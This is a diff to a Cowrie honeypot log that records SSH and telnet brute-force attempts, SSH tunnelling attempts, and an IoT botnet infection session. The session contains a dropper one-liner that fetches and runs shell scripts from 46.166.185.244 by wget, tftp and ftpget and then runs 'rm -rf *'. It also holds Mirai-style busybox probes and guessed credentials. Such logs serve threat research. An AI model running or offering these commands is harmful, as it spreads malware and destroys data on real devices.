@@ -3498,3 +3498,123 @@
 2017-05-07T04:29:50+0000 [HoneyPotSSHTransport,68830,130.206.99.99] Connection lost after 2 seconds
 2017-05-07T04:29:54+0000 [CowrieTelnetTransport,47477,94.177.199.19] Connection lost after 59 seconds
 2017-05-07T04:29:55+0000 [CowrieTelnetTransport,47478,94.177.199.19] Connection lost after 58 seconds
+2017-05-07T04:30:10+0000 [CowrieTelnetTransport,47481,124.127.198.8] Connection lost after 66 seconds
+2017-05-07T04:30:25+0000 [CowrieTelnetTransport,47482,94.177.199.19] Connection lost after 58 seconds
+2017-05-07T04:30:32+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 103.61.8.51:60503 (10.8.41.81:2222) [session: 067fc545]
+2017-05-07T04:30:33+0000 [HoneyPotSSHTransport,68831,103.61.8.51] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-05-07T04:30:33+0000 [HoneyPotSSHTransport,68831,103.61.8.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-07T04:30:33+0000 [HoneyPotSSHTransport,68831,103.61.8.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-07T04:30:33+0000 [HoneyPotSSHTransport,68831,103.61.8.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-07T04:30:35+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:45661 (10.8.41.81:2222) [session: a2a2beb6]
+2017-05-07T04:30:35+0000 [HoneyPotSSHTransport,68832,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-07T04:30:35+0000 [HoneyPotSSHTransport,68832,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-07T04:30:35+0000 [HoneyPotSSHTransport,68832,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-07T04:30:35+0000 [HoneyPotSSHTransport,68832,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-07T04:30:35+0000 [HoneyPotSSHTransport,68832,130.206.99.99] NEW KEYS
+2017-05-07T04:30:36+0000 [HoneyPotSSHTransport,68832,130.206.99.99] starting service 'ssh-userauth'
+2017-05-07T04:30:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,68832,130.206.99.99] 'root' trying auth 'password'
+2017-05-07T04:30:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,68832,130.206.99.99] login attempt: 4592
+2017-05-07T04:30:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,68832,130.206.99.99] login return, expect: [aa/123456]
+2017-05-07T04:30:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,68832,130.206.99.99] login attempt [root/adele123] failed
+2017-05-07T04:30:37+0000 [HoneyPotSSHTransport,68831,103.61.8.51] connection lost
+2017-05-07T04:30:37+0000 [HoneyPotSSHTransport,68831,103.61.8.51] Connection lost after 4 seconds
+2017-05-07T04:30:37+0000 [-] 'root' failed auth 'password'
+2017-05-07T04:30:37+0000 [-] unauthorized login: 
+2017-05-07T04:30:38+0000 [HoneyPotSSHTransport,68832,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-07T04:30:38+0000 [HoneyPotSSHTransport,68832,130.206.99.99] connection lost
+2017-05-07T04:30:38+0000 [HoneyPotSSHTransport,68832,130.206.99.99] Connection lost after 2 seconds
+2017-05-07T04:30:39+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 94.177.199.19:58641 (10.8.41.81:2223) [session: TT47483]
+2017-05-07T04:30:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] got channel 'direct-tcpip' request
+2017-05-07T04:30:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] direct-tcp connection request to 87.240.165.82:443 from localhost:5556
+2017-05-07T04:30:39+0000 [SSHChannel None (10) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] direct-tcp forward to 87.240.165.82:443 with data '\x16\x03\x01\x01;\x01\x00\x017\x03\x01Y\x0e\xa2\xd5?\xd2T{Gq\xa5A\n\x1a\xcb\x8d\x0b\x9b\x14\xd4{c6\xe0{YV\xe7\x8c\xde\x1b\x16\x00\x00\x1c\xc0\x14\xc0\x13\x009\x003\x005\x00/\xc0\n\xc0\t\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x00\xf2\x00\x00\x00\x11\x00\x0f\x00\x00\x0coauth.vk.com\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00#\x00\xc0f\xcc~2\x0e\x86T\xac\xad\x10\'GBL#\x1f$\x81X\xe35\xd7\xbb\xcc\xf3n&\xb0\xeci\x11\xe6\xce\xb2\x82-\xab\xb3(hN\x06\xa0\xaeG\xb7\x0bQ%\xb9A\xcb\x85#\xa8\x1d\xbf\xca\xa1-[\xff*\xc8\x08\xdea\xecC\xaer\xb7\xcaG\x14sT\x9aD\xb8\x94&0U\x86\xda+596\xbd\xc2\xf2\x1e"P02\xbc\x0f\xc9\xb8\x14A\xa0\xc4\xd9\xcd\x01;\x10\xce\xfd\xd0/&y\x92j\x14\xb4O\xc3\xb3%\xb2:\x0ba\xc1?\x98\xba\xb7\x8a\x1f.\xdbE\x15\xd4\xa7\xe6\x9a\xc2\xf3\xfa=\x04%\xbc\x1b.G\xc9C{\xcc\xcc\x1b5\x98\x96KkQoJ\xaa.q\xdbQ\xbd~!\xdc\x98\x83\xa2&\xecx\xc1\xa1\x90\x9cZ&U2\x14\x00\x17\x00\x00\xff\x01\x00\x01\x00'
+2017-05-07T04:30:39+0000 [SSHChannel None (10) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] failed to connect: Connection refused
+2017-05-07T04:30:39+0000 [SSHChannel None (10) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] sending close 10
+2017-05-07T04:30:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] got channel 'direct-tcpip' request
+2017-05-07T04:30:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] direct-tcp connection request to 87.240.165.82:443 from localhost:5556
+2017-05-07T04:30:40+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] direct-tcp forward to 87.240.165.82:443 with data "\x16\x03\x01\x01;\x01\x00\x017\x03\x01Y\x0e\xa2\xd5\xd36\xb3\xcfE(\x1f\x80Bw\xd5\x84\xd5\x98\x96\x93\x14\x17[\xaf\xd6M\xc6b\xaf@3z\x00\x00\x1c\xc0\x14\xc0\x13\x009\x003\x005\x00/\xc0\n\xc0\t\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x00\xf2\x00\x00\x00\x11\x00\x0f\x00\x00\x0coauth.vk.com\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00#\x00\xc0f\xcc~2\x0e\x86T\xac\xad\x10'GBL#\x1f\\\xcb\t\x0b\x9d\xfc3\x0br\x00\xed\x16XS\xe5\xae\xeeu\xf0z\xa8T\xe3y\xe6xv\t\x94\x0f8\x06\xdfN%\xed\xcd\xe5\xc7C\xd6\x11o\x9c\xaa\xe0N\xc2\xa0Aw\x11\xc7{^k\xdf\x8c\x13\x9d\xa3\xc8\x93\x04\x063\xf8s\xdfN\xae\xe3XV-\t\xe2b=\xfa\xb89U\xab\xf1\xd2X1\xb4\x1a\xe3\x7f}\xf2\xa7f\x87{G\xc6U/\xb6\xbe\xc8\xb9W\x0eG\xfaH\xea\xe6\x15 \xf3\xd4\x00\x1a\xd7y\xf6|\xda\xda\x8d\xe5\xbfm\x86\x93\x1d\xb4\xaa\xb7\xb3\xcf\xa6\xba\x96\x07g\xcdT]o+^\x0c\xe0\x94\x9e\xde\xe4\xdf\xad\x04\x0f\xf4\xcabR\xa8\x82\xcaw\x08\x9ai\x91[\x1c$D\xea^\x00\x17\x00\x00\xff\x01\x00\x01\x00"
+2017-05-07T04:30:40+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] failed to connect: Connection refused
+2017-05-07T04:30:40+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,68804,91.195.103.188] sending close 11
+2017-05-07T04:30:40+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 94.177.199.19:35450 (10.8.41.81:2223) [session: TT47484]
+2017-05-07T04:30:44+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt: 271
+2017-05-07T04:30:44+0000 [CowrieTelnetTransport,47483,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:30:44+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt [admin/] failed
+2017-05-07T04:30:44+0000 [CowrieTelnetTransport,47483,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt: 272
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt [enable/shell] failed
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt: 273
+2017-05-07T04:30:45+0000 [CowrieTelnetTransport,47483,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:30:46+0000 [CowrieTelnetTransport,47483,94.177.199.19] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.244/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; tftp 46.166.185.244 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 46.166.185.244; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.244 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *] failed
+2017-05-07T04:30:46+0000 [CowrieTelnetTransport,47483,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:30:46+0000 [CowrieTelnetTransport,47484,94.177.199.19] login attempt: 274
+2017-05-07T04:30:46+0000 [CowrieTelnetTransport,47484,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:30:47+0000 [CowrieTelnetTransport,47484,94.177.199.19] login attempt [admin/5up] succeeded
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Opening TTY Log: log/tty/20170507-043049-None-47484i.log
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: enable
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: enable 
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: shell
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command not found: shell
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: sh
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: sh 
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.244/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; tftp 46.166.185.244 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 46.166.185.244; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.244 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /tmp
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /var/run
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /mnt
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /root
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: wget http://46.166.185.244/kittyhaxz.sh
+2017-05-07T04:30:49+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.244/kittyhaxz.sh>
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] QUEUED INPUT: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: chmod 777 kittyhaxz.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: sh kittyhaxz.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: tftp 46.166.185.244 -c get ktftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: chmod 777 ktftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: sh ktftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: tftp -r ktftp2.sh -g 46.166.185.244
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: chmod 777 ktftp2.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: sh ktftp2.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.244 ftp1.sh ftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] FTP connect failed: host=46.166.185.244, port=21, err=[Errno 111] Connection refused
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: sh ftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-07T04:30:49+0000 [Uninitialized] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.244/kittyhaxz.sh>
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox ps; /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ps
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox cat /proc/mounts
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox cat /dev/.nippon
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox rm /dev/.nippon
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: cd /
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: cd /
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox cp /bin/echo dvrHelper
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: > dvrHelper
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox chmod 777 /dvrHelper
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox cat /bin/echo
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox cat /bin/echo
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] CMD: /bin/busybox ECCHI
+2017-05-07T04:30:49+0000 [CowrieTelnetTransport,47484,94.177.199.19] Command found: /bin/busybox ECCHI
+2017-05-07T04:30:55+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 94.177.199.19:58843 (10.8.41.81:2223) [session: TT47485]
+2017-05-07T04:30:58+0000 [CowrieTelnetTransport,47485,94.177.199.19] login attempt: 275
+2017-05-07T04:30:58+0000 [CowrieTelnetTransport,47485,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:30:59+0000 [CowrieTelnetTransport,47485,94.177.199.19] login attempt [Administrator/] failed
+2017-05-07T04:30:59+0000 [CowrieTelnetTransport,47485,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:30:59+0000 [CowrieTelnetTransport,47485,94.177.199.19] login attempt: 276
+2017-05-07T04:30:59+0000 [CowrieTelnetTransport,47485,94.177.199.19] login return, expect: [admin/5up]
+2017-05-07T04:31:00+0000 [CowrieTelnetTransport,47485,94.177.199.19] login attempt [enable/shell] failed
+2017-05-07T04:31:00+0000 [CowrieTelnetTransport,47485,94.177.199.19] Warning: state changed and new state returned
+2017-05-07T04:31:00+0000 [CowrieTelnetTransport,47485,94.177.199.19] login attempt: 277
+2017-05-07T04:31:00+0000 [CowrieTelnetTransport,47485,94.177.199.19] login return, expect: [admin/5up]
